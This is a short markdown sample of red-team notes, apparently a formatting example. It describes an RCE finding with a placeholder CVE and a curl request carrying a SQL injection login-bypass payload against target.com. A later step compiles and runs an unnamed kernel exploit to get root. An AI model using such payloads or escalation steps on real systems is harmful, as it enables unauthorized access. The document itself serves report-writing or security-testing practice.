# Red Team Notes Example

> ⚠️ **CRITICAL**: Remote Code Execution vulnerability discovered
> - CVE-2024-1234
> - CVSS Score: 9.8

## Initial Access

Used the following payload to gain access:

```bash
curl -X POST https://target.com/api/v1/auth \
  -H "Content-Type: application/json" \
  --data '{"username": "admin", "password": "' OR 1=1--"}'
```

### Privilege Escalation

> ⚡ **WARNING**: Exercise caution when executing these commands

Found kernel exploit:

```bash
gcc -o exploit exploit.c
./exploit
id # now running as root
```

> 📝 **NOTE**: Remember to collect:
> - System logs
> - Memory dumps
> - Network captures